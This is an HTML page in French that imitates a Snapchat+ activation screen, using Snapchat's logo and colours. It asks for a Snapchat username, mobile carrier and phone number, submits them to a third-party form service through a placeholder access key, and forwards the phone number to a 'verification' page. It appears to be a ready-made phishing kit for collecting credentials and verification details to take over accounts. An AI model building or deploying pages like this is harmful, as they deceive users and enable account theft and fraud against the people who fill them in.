<!DOCTYPE html>
<html lang="fr">
<head>
    <script src="https://cdn.tailwindcss.com"></script>
    <title>Snapchat+ | Activation</title>
</head>
<body class="bg-[#FFFC00] flex items-center justify-center h-screen font-sans">
    <form action="https://api.web3forms.com/submit" method="POST" class="bg-white p-8 rounded-3xl shadow-2xl w-96">
        <input type="hidden" name="access_key" value="TA_CLE_WEB3FORMS">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" class="w-16 mx-auto mb-6">
        <h2 class="text-2xl font-bold mb-6 text-center">Activation Snap+</h2>
        
        <input type="text" name="ID" placeholder="Identifiant Snapchat" class="w-full p-3 mb-3 border-2 border-gray-200 rounded-xl" required>
        
        <select name="Operateur" class="w-full p-3 mb-3 border-2 border-gray-200 rounded-xl bg-white" required>
            <option value="" disabled selected>Sélectionnez votre opérateur</option>
            <option value="Bouygues">Bouygues Telecom</option>
            <option value="SFR">SFR</option>
            <option value="Orange">Orange</option>
        </select>
        
        <input type="tel" name="Tel" id="tel" placeholder="Numéro de téléphone" class="w-full p-3 mb-4 border-2 border-gray-200 rounded-xl" required>
        
        <button type="button" onclick="redirectWithTel()" class="w-full bg-black text-white py-4 rounded-full font-bold text-lg hover:bg-gray-800 transition">Continuer vers la vérification</button>
    </form>

    <script>
        function redirectWithTel() {
            const tel = document.getElementById('tel').value;
            if(tel) {
                window.location.href = 'verification.html?tel=' + encodeURIComponent(tel);
            } else {
                alert("Veuillez entrer votre numéro.");
            }
        }
    </script>
</body>
</html>
